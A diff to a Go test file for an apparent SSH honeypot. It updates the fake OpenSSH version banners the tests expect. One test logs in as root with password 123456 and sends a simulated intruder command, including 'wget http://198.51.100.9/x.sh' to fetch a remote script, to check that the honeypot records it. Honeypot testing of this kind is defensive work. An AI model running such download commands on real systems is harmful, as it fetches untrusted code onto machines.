@@ -57,7 +57,7 @@ func sshDial(t *testing.T, addr, user, password string) *cryptossh.Client {
 func TestSSHShellExec(t *testing.T) {
 	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 3)
 	client := sshDial(t, addr, "root", "123456")
-	require.Equal(t, "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3", string(client.ServerVersion()))
+	require.Equal(t, "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u9", string(client.ServerVersion()))
 	sess, err := client.NewSession()
 	require.NoError(t, err)
 	out, err := sess.CombinedOutput("uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh")
@@ -140,7 +140,7 @@ func TestSSHRecallPersonaAndAttempts(t *testing.T) {
 			require.Error(t, err, "connection %d", i)
 		} else {
 			require.NoError(t, err)
-			require.Equal(t, "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3", string(client.ServerVersion()))
+			require.Equal(t, "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u5", string(client.ServerVersion()))
 			client.Close()
 		}
 		_, frames := waitSSHEvent(t, hp, done)
@@ -159,7 +159,7 @@ func TestSSHPersonaOverride(t *testing.T) {
 	buf := make([]byte, 64)
 	n, err := conn.Read(buf)
 	require.NoError(t, err)
-	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3\r\n"))
+	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u5\r\n"))
 	conn.Close()
 	_, frames := waitSSHEvent(t, hp, done)
 	require.Equal(t, "debian-11", frames[0].Variant)
